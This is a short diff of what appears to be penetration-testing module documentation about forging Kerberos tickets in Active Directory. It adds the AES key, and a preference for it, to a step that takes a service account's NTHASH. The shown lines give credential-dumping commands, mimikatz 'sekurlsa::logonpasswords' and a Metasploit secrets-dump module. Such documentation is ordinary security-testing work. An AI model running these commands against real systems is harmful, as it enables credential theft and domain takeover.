@@ -14,7 +14,7 @@ Any system leveraging kerberos as a means of authentication e.g. Active Director
     `mimikatz # sekurlsa::logonpasswords`
     or
     `use auxiliary/gather/windows_secrets_dump`
-3. Finally get the NTHASH of the service account you wish to target: e.g.
+3. Finally get the NTHASH or AES key (prefer AES key if available) of the service account you wish to target: e.g.
     `mimikatz # sekurlsa::logonpasswords` - same command as before, shows you both values
 
 ## Verification Steps
